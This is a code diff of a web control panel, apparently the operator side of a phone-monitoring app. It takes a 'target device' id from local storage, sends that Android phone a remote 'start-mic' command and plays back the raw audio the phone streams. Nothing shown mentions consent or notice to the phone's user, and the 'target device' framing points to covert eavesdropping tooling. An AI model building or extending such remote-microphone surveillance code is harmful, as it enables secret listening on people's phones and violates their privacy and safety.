@@ -7,22 +7,15 @@
     <script src="/socket.io/socket.io.js"></script> 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* 🔥 OLD GUI STYLE RESTORED */
         :root { --accent: #00ff88; --bg: #0a0a0a; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow: hidden; }
         
         .header { padding: 20px; display: flex; align-items: center; gap: 15px; background: #111; border-bottom: 1px solid #222; }
-        .back-btn { color: white; text-decoration: none; font-size: 1.2rem; }
+        .back-btn { color: white; text-decoration: none; font-size: 1.2rem; cursor: pointer; }
         
-        /* Input Box for Device ID (Center) */
-        .id-container { margin-top: 20px; }
-        .id-input {
-            background: #222; border: 1px solid #444; color: #00ff88; 
-            padding: 10px 15px; border-radius: 5px; font-size: 16px; 
-            text-align: center; width: 60%; font-weight: bold; letter-spacing: 1px;
-            outline: none;
-        }
-        .id-input:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0,255,136,0.2); }
+        /* Device Name Display (No Input Box) */
+        .device-info { margin-top: 20px; color: #aaa; font-size: 14px; letter-spacing: 1px; }
+        .device-info span { color: var(--accent); font-weight: bold; font-size: 18px; }
 
         .mic-container { height: 45vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
@@ -63,12 +56,12 @@
 </head>
 <body>
     <div class="header">
-        <a href="/" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
-        <h3>Server Live Monitor</h3>
+        <div onclick="window.history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</div>
+        <h3>Live Audio Stream</h3>
     </div>
 
-    <div class="id-container">
-        <input type="text" id="targetID" class="id-input" placeholder="ENTER DEVICE ID HERE">
+    <div class="device-info">
+        TARGET DEVICE: <span id="targetDisplay">LOADING...</span>
     </div>
 
     <div class="mic-container">
@@ -81,7 +74,7 @@
             <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
             <div class="bar"></div><div class="bar"></div>
         </div>
-        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">WAITING FOR CONNECTION...</p>
+        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">READY TO CONNECT</p>
     </div>
 
     <div class="controls">
@@ -96,22 +89,31 @@
     </div>
 
     <script>
-        const SERVER_URL = window.location.origin; // Server URL automatically utha lega
+        const SERVER_URL = window.location.origin;
         let socket;
         let audioContext;
         let nextTime = 0;
-        let vizInterval;
         let isStreaming = false;
+        let currentDeviceId = null;
+
+        // 🔥 Page Load hote hi LocalStorage check karega
+        window.onload = function() {
+            // 'active_device_id' key check kar raha hu (Parent app me yahi naam hona chahiye)
+            currentDeviceId = localStorage.getItem("active_device_id");
+
+            if (!currentDeviceId) {
+                document.getElementById('targetDisplay').innerText = "NO DEVICE SELECTED";
+                alert("⚠️ Error: No Device Selected! Please go back and select a device.");
+                document.getElementById('startBtn').disabled = true;
+            } else {
+                document.getElementById('targetDisplay').innerText = currentDeviceId;
+            }
+        };
 
         function connectAndListen() {
-            // 1. ID Check karo
-            const deviceId = document.getElementById('targetID').value.trim().toUpperCase();
-            if (!deviceId) {
-                alert("⚠️ Please Enter Device ID First!");
-                return;
-            }
+            if (!currentDeviceId) return;
 
-            // 2. Audio Context Init (Browser Rule)
+            // Audio Context Setup
             if (!audioContext) {
                 audioContext = new (window.AudioContext || window.webkitAudioContext)();
             }
@@ -119,27 +121,31 @@
                 audioContext.resume();
             }
 
-            document.getElementById('statusText').innerText = "CONNECTING TO " + deviceId + "...";
+            document.getElementById('statusText').innerText = "CONNECTING...";
             document.getElementById('statusText').style.color = "yellow";
 
-            // 3. Socket Connect
-            if(socket) socket.disconnect(); // Purana connection todo agar hai to
+            if(socket) socket.disconnect();
             socket = io(SERVER_URL);
 
             socket.on("connect", () => {
                 console.log("Connected to Server");
                 
-                // 🔥 MAIN LOGIC: Sirf is ID wale Room ko Join karo
-                socket.emit("join", deviceId);
+                // 🔥 Auto Join using LocalStorage ID
+                socket.emit("join", currentDeviceId);
                 
-                document.getElementById('statusText').innerText = "🔴 LISTENING: " + deviceId;
+                // Phone ko command bhejo ki Mic chalu kare
+                socket.emit("control-event", {
+                    room: currentDeviceId,
+                    action: "start-mic"
+                });
+                
+                document.getElementById('statusText').innerText = "🔴 LISTENING LIVE";
                 document.getElementById('statusText').style.color = "#00ff88";
 
                 startUIEffects();
                 isStreaming = true;
             });
 
-            // 4. Audio Data Receive & Play
             socket.on("audio-stream", (arrayBuffer) => {
                 if (!isStreaming) return;
                 playPcmChunk(arrayBuffer);
@@ -150,7 +156,6 @@
             });
         }
 
-        // 🔥 RAW PCM PLAYER (Android se aane wala raw sound play karega)
         function playPcmChunk(arrayBuffer) {
             if (!audioContext) return;
 
@@ -158,7 +163,7 @@
             const float32Array = new Float32Array(int16Array.length);
 
             for (let i = 0; i < int16Array.length; i++) {
-                float32Array[i] = int16Array[i] / 32768; // Convert 16-bit to Float
+                float32Array[i] = int16Array[i] / 32768; 
             }
 
             const audioBuffer = audioContext.createBuffer(1, float32Array.length, 44100);
@@ -174,22 +179,27 @@
             source.start(nextTime);
             nextTime += source.buffer.duration;
             
-            // Visualizer Effect on Data
             animateBars();
         }
 
         function stopListen() {
             isStreaming = false;
             if (socket) {
+                // Phone ko command bhejo ki Mic band kare
+                if(currentDeviceId) {
+                    socket.emit("control-event", {
+                        room: currentDeviceId,
+                        action: "stop-mic"
+                    });
+                }
                 socket.disconnect();
                 socket = null;
             }
             stopUIEffects();
-            document.getElementById('statusText').innerText = "DISCONNECTED";
+            document.getElementById('statusText').innerText = "STOPPED";
             document.getElementById('statusText').style.color = "#888";
         }
 
-        // --- VISUAL EFFECTS ---
         function startUIEffects() {
             document.getElementById('micCircle').classList.add('active');
             document.getElementById('startBtn').classList.add('active');
@@ -206,7 +216,6 @@
         }
 
         function animateBars() {
-            // Fake animation based on data reception
             document.querySelectorAll('.bar').forEach(b => {
                 b.style.height = (Math.random() * 40 + 15) + "px";
             });
